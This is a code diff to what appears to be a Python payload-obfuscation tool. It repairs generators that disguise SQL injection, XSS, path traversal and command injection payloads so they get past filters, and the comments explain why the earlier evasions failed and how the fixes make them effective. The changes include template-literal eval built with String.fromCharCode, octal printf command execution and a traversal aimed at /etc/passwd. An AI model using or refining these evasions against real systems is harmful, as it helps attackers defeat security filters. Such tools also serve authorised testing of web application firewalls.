@@ -25,6 +25,7 @@ from __future__ import annotations
 import argparse
 import html
 import os
+import itertools
 import random
 import sys
 import unicodedata
@@ -119,22 +120,33 @@ def _random_case(s: str) -> str:
     return "".join(c.upper() if c.isalpha() and rng.random() > 0.5 else c for c in s)
 
 
+_INLINE_COMMENT_SEQS = ["/**/", "/*!50000*/", "/**_**/"]
+_inline_comment_counter = itertools.count()
+
+
 def _inline_comment_spaces(s: str) -> str:
-    """Replace spaces with inline comment sequences for SQLi bypass."""
-    variants = ["/**/", "/*!50000*/", "/**_**/"]
-    result = s
-    for v in variants:
-        result = result.replace(" ", v)
-    return result
+    """Replace spaces with an inline comment sequence for SQLi bypass.
+
+    Rotates through the sequences across calls — the old implementation ran
+    three `.replace(" ", v)` over the SAME string in sequence, so after the
+    first pass no spaces remained and `/*!50000*/` / `/**_**/` were dead.
+    """
+    seq = _INLINE_COMMENT_SEQS[next(_inline_comment_counter) % len(_INLINE_COMMENT_SEQS)]
+    return seq.join(s.split(" "))
+
+
+_WS_ALTS = ["\t", "\n", "\x0b", "\x0c", "\r"]
+_whitespace_counter = itertools.count()
 
 
 def _whitespace_variant(s: str) -> str:
-    """Replace spaces with alternative whitespace characters."""
-    alts = ["\t", "\n", "\x0b", "\x0c", "\r"]
-    result = s
-    for alt in alts:
-        result = result.replace(" ", alt)
-    return result
+    """Replace spaces with an alternative whitespace character.
+
+    Rotates across calls for the same reason as _inline_comment_spaces: the
+    old chained replaces self-overwrote and only `\t` was ever produced.
+    """
+    alt = _WS_ALTS[next(_whitespace_counter) % len(_WS_ALTS)]
+    return alt.join(s.split(" "))
 
 
 # ---------------------------------------------------------------------------
@@ -343,8 +355,8 @@ XSS_OBFUSCATIONS: list[dict] = [
     },
     {
         "technique": "backtick_js",
-        "description": "Use backticks and String.fromCharCode to build JS payload",
-        "generator": lambda p: "`${" + "".join(f"String.fromCharCode({ord(c)})+" for c in p).rstrip("+") + "}`",
+        "description": "Template-literal eval via String.fromCharCode (executes inside a JS template literal)",
+        "generator": lambda p: "${eval(String.fromCharCode(" + ",".join(str(ord(c)) for c in p) + "))}",
     },
     {
         "technique": "eval_base64",
@@ -381,8 +393,12 @@ PATH_TRAVERSAL_OBFUSCATIONS: list[dict] = [
     },
     {
         "technique": "forward_backward_mix",
-        "description": "Mix forward and backward slashes",
-        "generator": lambda p: p.replace("/", "\\").replace("\\\\", "/"),
+        "description": "Mix forward and backward slashes alternately",
+        # The old chained replaces were a no-op round trip (single "\"
+        # never matched the "\\\\" pattern). Interleave instead.
+        "generator": lambda p: "".join(
+            "\\" if ch == "/" and i % 2 else ch for i, ch in enumerate(p)
+        ),
     },
     {
         "technique": "dot_truncation",
@@ -392,7 +408,10 @@ PATH_TRAVERSAL_OBFUSCATIONS: list[dict] = [
     {
         "technique": "absolute_path",
         "description": "Use absolute paths instead of relative",
-        "generator": lambda p: p.replace("../", "/etc/passwd" if "etc" not in p else "../"),
+        # The old form rewrote EVERY ../ into "/etc/passwd", destroying the
+        # traversal it was supposed to obfuscate. Collapse leading traversal
+        # into one absolute target.
+        "generator": lambda p: ("/" + p.lstrip("./")) if p.startswith("../") else p,
     },
     {
         "technique": "null_byte_truncation",
@@ -415,7 +434,11 @@ CMD_INJECTION_OBFUSCATIONS: list[dict] = [
     {
         "technique": "nested_expansion",
         "description": "Nested command substitution $($(...)) ",
-        "generator": lambda p: p.replace("$(", "$($(").replace(")", "))").replace("$)$(", ""),
+        # Guarded so parens are only doubled when $() is present (doubling
+        # ")" on a plain payload corrupted it); the trailing no-op replace
+        # is gone.
+        "generator": lambda p: (p.replace("$(", "$($(").replace(")", "))")
+                                if "$(" in p else p),
     },
     {
         "technique": "wildcard_obfuscation",
@@ -434,8 +457,11 @@ CMD_INJECTION_OBFUSCATIONS: list[dict] = [
     },
     {
         "technique": "hex_encoding",
-        "description": "Hex-encode command for printf execution",
-        "generator": lambda p: f"$(printf \"{_hex_encode(p)}\")",
+        "description": "Octal-encode command for POSIX-safe printf %b execution",
+        # \xNN is NOT expanded by POSIX printf; %b with \NNN octal is the
+        # portable form.
+        "generator": lambda p: "$(printf '%b' '"
+                               + "".join(f"\\{ord(c):03o}" for c in p) + "')",
     },
     {
         "technique": "double_encoding",
